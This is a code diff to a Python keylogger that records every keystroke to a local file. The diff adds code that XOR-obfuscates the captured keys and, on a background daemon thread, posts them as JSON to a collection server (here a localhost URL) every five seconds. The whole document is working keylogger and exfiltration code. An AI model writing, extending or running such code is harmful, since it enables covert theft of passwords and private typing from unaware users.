@@ -1,11 +1,31 @@
 import keyboard                      #Import a library that records keyboard keystrokes.
 from datetime import datetime            #Import a library that records date and time.
 from Xor_2 import xor_on_key
-
+import requests
+import threading
+import time
 
 dicti = {}                                          #A dictionary for saving input from the keyboard.
+my_json = {}
 str_for_show = ''
+
 filename = r"C:\my_python\+\file_for_kelogger.txt"
+
+url = f"http://127.0.0.1:5000/save_data"
+
+
+def send_data_to_server():
+    status = requests.post(url, json=my_json)
+    return status
+
+def time_stoper(timeout, func):
+    def wrapper():
+        while True:
+            func()
+            time.sleep(timeout)
+    t = threading.Thread(target=wrapper, daemon=True)
+    t.start()
+
 
 
 def on_key_press(key):
@@ -19,12 +39,16 @@ def on_key_press(key):
     current_time = datetime.now().strftime('%d/%m/%y %H:%M')
     with open(filename, "a") as our_file:
         if current_time not in dicti:
+            my_json[current_time] = ''
             dicti[current_time] = ''
             our_file.write(f"**** {current_time} ****\n")
 
         our_file.write(key)
+    jesony = xor_on_key(key, 7)
+    my_json[current_time] += jesony
     dicti[current_time] += key
     str_for_show += key
+    # send_data_to_server()
     
     if "show" in str_for_show.lower():
         for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
@@ -54,5 +78,8 @@ def on_key_press(key):
 if __name__ == "__main__":
     my_file = open(filename, "w")
     my_file.write("")
+
     keyboard.on_press(on_key_press)               #function call.
+    print("program start")
+    time_stoper(5, send_data_to_server)
     keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.
